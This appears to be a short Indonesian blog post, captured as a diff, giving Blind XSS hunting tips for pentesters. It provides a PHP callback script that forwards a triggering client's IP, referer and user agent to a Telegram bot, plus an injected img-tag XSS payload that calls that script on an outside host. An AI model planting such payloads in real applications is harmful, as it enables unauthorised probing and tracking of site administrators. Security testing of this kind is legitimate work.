@@ -1,0 +1,74 @@
+I"¬<p><img src="/images/blind_xss_banner.jpg" alt="Blind XSS" /></p>
+
+<p>Blind XSS merupakan salah satu kerentanan yang berpotensi memiliki severity yang tinggi. Dikarenakan sebagian besar Blind XSS terjadi pada backend atau panel suatu aplikasi, dan cenderung berjalan pada privilege yang lebih tinggi dari user biasa, admin misalnya.</p>
+
+<p>Ada banyak sekali situs yang menyediakan layanan untuk Blind XSS, salah satunya XSS Hunter. XSS Hunter sangat ampuh digunakan untuk <em>berburu</em> Blind XSS karena didukung dengan email report yang langsung kita terima bila XSS ter-triger. Dan laporan yang lengkap seperti, URL Referer, Web Page Screenshot, bahkan HTML DOM nya.</p>
+
+<p>Namun apabila kita melakukan <em>pentesting</em> pada perusahaan yang cukup besar, dapatkah kita mempercayakannya pada pihak ketiga?</p>
+
+<p>Berikut ini adalah source code sederhana untuk notifikasi Blind XSS. Dengan menggunakan Bot Telegram, kita akan mendapat notifikasi bila payload ter-triger.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="nb">ob_flush</span><span class="p">();</span>
+<span class="nb">header</span><span class="p">(</span><span class="s2">"Content-type:application/json"</span><span class="p">);</span>
+
+<span class="k">function</span> <span class="nf">get_client_ip</span><span class="p">()</span> <span class="p">{</span>
+    <span class="nv">$ipaddress</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_CLIENT_IP'</span><span class="p">]))</span>
+        <span class="nv">$ipaddress</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_CLIENT_IP'</span><span class="p">];</span>
+    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_X_FORWARDED_FOR'</span><span class="p">]))</span>
+        <span class="nv">$ipaddress</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_X_FORWARDED_FOR'</span><span class="p">];</span>
+    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_X_FORWARDED'</span><span class="p">]))</span>
+        <span class="nv">$ipaddress</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_X_FORWARDED'</span><span class="p">];</span>
+    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_FORWARDED_FOR'</span><span class="p">]))</span>
+        <span class="nv">$ipaddress</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_FORWARDED_FOR'</span><span class="p">];</span>
+    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_FORWARDED'</span><span class="p">]))</span>
+        <span class="nv">$ipaddress</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_FORWARDED'</span><span class="p">];</span>
+    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">]))</span>
+        <span class="nv">$ipaddress</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">];</span>
+    <span class="k">else</span>
+        <span class="nv">$ipaddress</span> <span class="o">=</span> <span class="s1">'UNKNOWN'</span><span class="p">;</span>
+    <span class="k">return</span> <span class="nv">$ipaddress</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nv">$ip</span> <span class="o">=</span> <span class="nx">get_client_ip</span><span class="p">();</span>
+<span class="nv">$ref</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_REFERER'</span><span class="p">];</span>
+<span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$ref</span><span class="p">)){</span>
+
+<span class="nv">$ref</span> <span class="o">=</span> <span class="s1">'-'</span><span class="p">;</span>
+
+<span class="p">}</span>
+
+<span class="nv">$datenow</span> <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s1">'Y-m-d H:i:s'</span><span class="p">);</span>
+<span class="nv">$ua</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_USER_AGENT'</span><span class="p">];</span>
+<span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$ua</span><span class="p">)){</span>
+
+<span class="nv">$ua</span> <span class="o">=</span> <span class="s1">'-'</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nv">$message</span> <span class="o">=</span> <span class="s1">'
+Blind XSS Alert!
+
+IP Address: '</span><span class="o">.</span><span class="nv">$ip</span><span class="o">.</span><span class="s1">'
+Reff URL: '</span><span class="o">.</span><span class="nv">$ref</span><span class="o">.</span><span class="s1">'
+Hitted: '</span><span class="o">.</span><span class="nv">$datenow</span><span class="o">.</span><span class="s1">'
+
+User Agent: '</span><span class="o">.</span><span class="nv">$ua</span><span class="o">.</span><span class="s1">'
+'</span><span class="p">;</span>
+
+<span class="nv">$message</span> <span class="o">=</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$message</span><span class="p">);</span>
+<span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'https://api.telegram.org/bot:{token}/sendMessage?chat_id={id}&amp;text='</span><span class="o">.</span><span class="nv">$message</span><span class="o">.</span><span class="s1">'&amp;parse_mode=html'</span><span class="p">);</span>
+
+</code></pre></div></div>
+
+<p>Setelah source tersebut diupload di server, kita dapat menyisipkannya pada payload XSS, contoh:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"&gt;&lt;img src="http://{redacted}/xsspayload.php"&gt;
+</code></pre></div></div>
+<p>Saat XSS ter-triger, notifikasi akan terkitim ke Telegram kita.</p>
+
+<p><img src="/images/bxxs_notif.png" alt="Hana I Love You" /></p>
+
+<p>Demikian sedikit tips untuk hunting Blind XSS, semoga bermanfaat.</p>
+
+:ET
